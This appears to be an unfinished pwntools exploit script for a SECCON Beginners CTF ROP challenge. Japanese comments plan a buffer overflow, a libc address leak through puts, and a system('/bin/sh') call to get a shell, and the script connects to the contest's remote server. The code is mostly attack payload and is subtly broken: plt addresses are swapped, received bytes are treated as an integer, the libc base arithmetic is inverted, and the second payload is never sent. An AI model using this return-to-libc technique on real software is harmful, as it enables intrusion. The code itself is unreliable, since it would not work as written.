#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.bits = 64
context.endian = 'little'

#0000000000401070 <puts@plt>:
# 401074:       f2 ff 25 9d 2f 00 00    bnd jmp QWORD PTR [rip+0x2f9d]        # 404018 <puts@GLIBC_2.2.5>
#0000000000401090 <gets@plt>:
# 401094:       f2 ff 25 8d 2f 00 00    bnd jmp QWORD PTR [rip+0x2f8d]        # 404028 <gets@GLIBC_2.2.5>

gets_plt = 0x401070  
puts_plt = 0x401090
puts_got = 0x404028
# 4010d8:       ff 15 12 2f 00 00       call   QWORD PTR [rip+0x2f12]        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
__libc_start_main_plt = 0x4010d8
__libc_start_main_got = 0x403ff0
main_rel = 0x021b10 #nm -D 
system_rel = 0x04f550 #nm -D

#これを使えばもっと楽。
elf = ELF('./chall')

'''
方針
payload1送信
BOFpayloadを送って、putsのplt使ってmain_gotを出力して、アドレスリーク
一旦main_pltを使って戻る。

アドレスリークの値からsystem関数のアドレスを計算
getsで待ち構えてるからsystem関数のアドレス＋ダミー＋/bin/shの　byte文字列を作成
payload2送信
get a shell

putsのgotの指す先値ををsystemに書き換える
/bin/sh送る
'''
#first payload
offset = 263  #実際何バイトでoverflow?
payload = b"A" * offset
payload += p64(puts_plt)
payload += p64(__libc_start_main_plt) #一旦mainに戻る。
payload += p64(__libc_start_main_got)

p = process('./chall')
p.sendline(payload)

#r = remote('beginners-rop.quals.beginners.seccon.jp',4102)
#r.send(payload)
#get address
__libc_start_main = p.recv()  #一旦どれくらい出力されるか確認する。
print(__libc_start_main)
#calculation
baseaddr = __libc_start_main - main_rel
systemaddr = baseaddr - system_rel

#second payload
payload = b"A" * offset
payload = p64(systemaddr + b'/bin/sh')
#r.interactive()



r = remote('beginners-rop.quals.beginners.seccon.jp', 4102)

#
#
#
#


#
